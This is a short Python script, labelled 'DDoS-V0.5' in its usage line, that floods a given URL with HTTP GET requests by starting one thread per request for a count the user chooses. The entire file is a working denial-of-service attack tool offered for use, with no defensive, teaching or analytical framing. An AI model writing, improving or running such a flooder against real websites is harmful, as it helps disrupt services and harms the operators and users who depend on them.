import threading
import requests
import sys

def attack(url, count):
    def send():
        try:
            response = requests.get(url)
            print(f"[+] Sent to {url} - Status: {response.status_code}")
        except Exception as e:
            print(f"[-] Failed: {e}")

    for _ in range(int(count)):
        thread = threading.Thread(target=send)
        thread.start()

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python DDoS-V0.5.py http://<ip/web> <jumlah_packet>")
    else:
        url = sys.argv[1]
        jumlah = sys.argv[2]
        attack(url, jumlah)
